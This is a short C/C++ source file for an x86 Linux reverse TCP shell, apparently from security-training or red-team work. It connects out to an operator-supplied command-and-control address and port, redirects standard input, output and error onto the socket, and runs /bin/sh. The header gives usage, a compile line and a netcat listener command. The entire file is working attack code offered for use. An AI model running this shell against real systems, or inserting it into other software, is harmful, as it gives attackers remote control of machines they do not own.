// Filename: reverse_tcp.cpp
// Author: Upayan a.k.a. slaeryan
// Purpose: This is a x86 Linux reverse TCP shell written in C/C++ that inputs
// the C2 address and the port from the console by the operator.
// Usage: ./reverse_tcp 192.168.1.104 8080
// Note: The connection attempt is not tuned so run the listener first.
// Compile with:
// g++ reverse_tcp.cpp -o reverse_tcp
// Testing: nc -lnvp 8080

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>

//#define C2_ADDR "192.168.1.104"
//#define C2_PORT 8080 

int main(int argc, char const *argv[])
{
	// Console C2 Address input from operator
	char* C2_ADDR = (char*)argv[1];
	// Console C2 Port input from operator
	char* c2portstring = (char*)argv[2];
	int C2_PORT = atoi(c2portstring);
    // Declaring a sockaddr_in struct and an int var for socket file descriptor
	struct sockaddr_in client;
	int sockfd;
	// Initializing the sockaddr_in struct
	client.sin_family = AF_INET;
	client.sin_addr.s_addr = inet_addr(C2_ADDR);
	client.sin_port = htons(C2_PORT);
	// 1st Syscall for creating the socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	// 2nd Syscall for connect()
	connect(sockfd, (struct sockaddr *)&client, sizeof(client));
	// 3rd Syscall for dup2()
	dup2(sockfd, 0); // STDIN
	dup2(sockfd, 1); // STDOUT
	dup2(sockfd, 2); // STDERR
	// 4th Syscall for execve()
	execve("/bin/sh", 0, 0);
	return 0;
}